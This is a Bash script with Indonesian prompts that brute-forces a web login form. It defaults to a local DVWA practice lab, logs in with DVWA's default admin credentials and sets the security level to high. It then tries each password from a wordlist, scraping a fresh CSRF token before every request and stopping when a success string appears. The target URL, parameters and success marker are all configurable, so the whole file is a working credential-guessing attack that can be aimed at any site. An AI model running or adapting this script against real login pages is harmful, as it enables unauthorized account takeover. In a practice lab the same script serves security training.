#!/bin/bash

# --- BAGIAN INPUT INTERAKTIF UNIVERSAL ---
read -p "[?] Input Target URL (default http://127.0.0.1:8000): " TARGET
TARGET="${TARGET:-http://127.0.0.1:8000}"

read -p "[?] Input path halaman target/brute (default /vulnerabilities/brute/): " PATH_TARGET
PATH_TARGET="${PATH_TARGET:-/vulnerabilities/brute/}"

read -p "[?] Pilih Metode Request [1] GET (Default) [2] POST: " METHOD_CHOICE
METHOD_CHOICE="${METHOD_CHOICE:-1}"

read -p "[?] Input nama parameter username (default username): " USER_PARAM
USER_PARAM="${USER_PARAM:-username}"

read -p "[?] Input nama parameter password (default password): " PASS_PARAM
PASS_PARAM="${PASS_PARAM:-password}"

read -p "[?] Input nama parameter token CSRF (kosongkan jika tidak ada, default user_token): " TOKEN_PARAM
TOKEN_PARAM="${TOKEN_PARAM:-user_token}"

read -p "[?] Input nama tombol submit/Login (default Login): " SUBMIT_PARAM
SUBMIT_PARAM="${SUBMIT_PARAM:-Login}"

read -p "[?] Input target username: " USER
read -p "[?] Input file name passlist: " PASS_FILE

read -p "[?] Input teks penanda sukses / Flag (default 'Welcome to the password protected area'): " SUCCESS_TEXT
SUCCESS_TEXT="${SUCCESS_TEXT:-Welcome to the password protected area}"

echo "-----------------------------------------------"

COOKIE_JAR="cookie.txt"
SECURITY_LEVEL="high"
rm -f "$COOKIE_JAR"

# Setup login awal & security level DVWA
echo "[*] Mengambil token login awal..."
INIT_RESP=$(curl -s -c "$COOKIE_JAR" "$TARGET/login.php")
USER_TOKEN=$(echo "$INIT_RESP" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")

if [ -n "$USER_TOKEN" ]; then
    echo "[*] Melakukan login awal ke DVWA..."
    curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
      --data "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" \
      "$TARGET/login.php" > /dev/null

    echo "[*] Set security: $SECURITY_LEVEL"
    SEC_PAGE=$(curl -s -b "$COOKIE_JAR" "$TARGET/security.php")
    T2=$(echo "$SEC_PAGE" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")
    curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
      --data "security=$SECURITY_LEVEL&seclev_submit=Submit&user_token=$T2" \
      "$TARGET/security.php" > /dev/null
fi

echo "[+] Target Aktif: $TARGET$PATH_TARGET"
echo "-----------------------------------------------"

while read -r PASS; do
  # Ambil halaman brute untuk mendapatkan user_token baru
  BRUTE_PAGE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$TARGET$PATH_TARGET")

  if [ -n "$TOKEN_PARAM" ]; then
    TOKEN_BRUTE=$(echo "$BRUTE_PAGE" | sed -n "s/.*$TOKEN_PARAM.*value=['\"]\([^'\"]*\).*/\1/p")
  else
    TOKEN_BRUTE=""
  fi

  # Eksekusi berdasarkan metode request yang dipilih
  if [ "$METHOD_CHOICE" = "2" ]; then
    if [ -n "$TOKEN_PARAM" ]; then
      RESP=$(curl -s -X POST \
        --data-urlencode "$USER_PARAM=$USER" \
        --data-urlencode "$PASS_PARAM=$PASS" \
        --data-urlencode "$TOKEN_PARAM=$TOKEN_BRUTE" \
        --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
        -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        "$TARGET$PATH_TARGET")
    else
      RESP=$(curl -s -X POST \
        --data-urlencode "$USER_PARAM=$USER" \
        --data-urlencode "$PASS_PARAM=$PASS" \
        --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
        -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        "$TARGET$PATH_TARGET")
    fi
  else
    if [ -n "$TOKEN_PARAM" ]; then
      RESP=$(curl -s -G \
        --data-urlencode "$USER_PARAM=$USER" \
        --data-urlencode "$PASS_PARAM=$PASS" \
        --data-urlencode "$TOKEN_PARAM=$TOKEN_BRUTE" \
        --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
        -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        "$TARGET$PATH_TARGET")
    else
      RESP=$(curl -s -G \
        --data-urlencode "$USER_PARAM=$USER" \
        --data-urlencode "$PASS_PARAM=$PASS" \
        --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
        -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        "$TARGET$PATH_TARGET")
    fi
  fi

  echo -e "\e[31m[-] Trying: $PASS\e[0m"

  if echo "$RESP" | grep -q "$SUCCESS_TEXT"; then
    echo ""
    echo -e "\e[32m[+] FOUND! Password $USER: $PASS\e[0m"
    break
  fi
done < "$PASS_FILE"

rm -f "$COOKIE_JAR"

